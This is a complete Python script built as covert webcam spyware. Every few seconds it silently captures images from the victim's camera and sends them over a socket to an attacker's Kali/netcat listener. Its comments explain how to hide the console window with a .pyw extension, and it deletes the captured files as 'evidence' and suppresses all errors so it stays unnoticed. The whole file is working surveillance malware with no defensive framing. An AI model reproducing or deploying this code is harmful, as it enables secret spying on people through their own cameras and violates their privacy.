# File name → secret.pyw   (must save with .pyw extension to hide console window)

import cv2
import socket
import time
import os

# ------------------ Configuration ------------------
KALI_IP = "192.168.1.104"           # ←←← Your Kali Linux / listening server IP
PORT = 9999                         # Port where netcat / server is listening
ALSO_SAVE_ON_WINDOWS = False        # Set True only for local testing
CAPTURE_FILENAME = "capture.jpg"

INTERVAL_SECONDS = 5                # ← Change this to control delay between captures
# ---------------------------------------------------

def send_file_to_server(filename, server_ip, server_port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((server_ip, server_port))
        
        with open(filename, "rb") as file_handle:
            sock.sendfile(file_handle)
        
        sock.close()
        return True
        
    except Exception:
        return False


# Endless loop - runs forever in background
while True:
    try:
        # Open default camera (0 = built-in laptop cam)
        camera = cv2.VideoCapture(0)
        # camera = cv2.VideoCapture(1)   # ← use this if external webcam
        
        if not camera.isOpened():
            time.sleep(INTERVAL_SECONDS)    # wait and try again later
            continue

        time.sleep(1.2)     # small delay so camera initializes properly
        
        success, frame = camera.read()
        camera.release()    # very important - release immediately

        if success:
            cv2.imwrite(CAPTURE_FILENAME, frame)
            
            # Optional: save copy to desktop for debugging
            if ALSO_SAVE_ON_WINDOWS:
                desktop_path = os.path.join(os.environ['USERPROFILE'], 'Desktop')
                save_path = os.path.join(desktop_path, f"test_{int(time.time())}.jpg")
                cv2.imwrite(save_path, frame)
            
            # Send to your server
            send_file_to_server(CAPTURE_FILENAME, KALI_IP, PORT)
            
            # Delete evidence (optional but recommended)
            try:
                os.remove(CAPTURE_FILENAME)
            except:
                pass

    except Exception:
        pass   # stay silent even on errors

    # Wait before next capture
    time.sleep(INTERVAL_SECONDS)
    
